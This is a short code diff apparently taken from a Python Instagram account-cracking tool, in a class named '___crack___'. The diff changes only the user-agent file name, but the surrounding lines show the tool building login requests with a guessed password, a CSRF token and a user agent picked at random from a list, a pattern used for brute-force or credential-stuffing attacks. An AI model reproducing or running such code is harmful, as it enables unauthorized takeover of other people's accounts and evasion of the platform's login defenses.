@@ -409,7 +409,7 @@ class ___crack___:
                 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                 'queryParams': {},
                 'optIntoOneTap': 'false'}
-                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
+                ___head = {'User-Agent': random.choice(open("Data/useragent.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
                 'Referer': 'https://i.instagram.com/api/v1/accounts/login/',
                 'x-csrftoken': ___csrf}
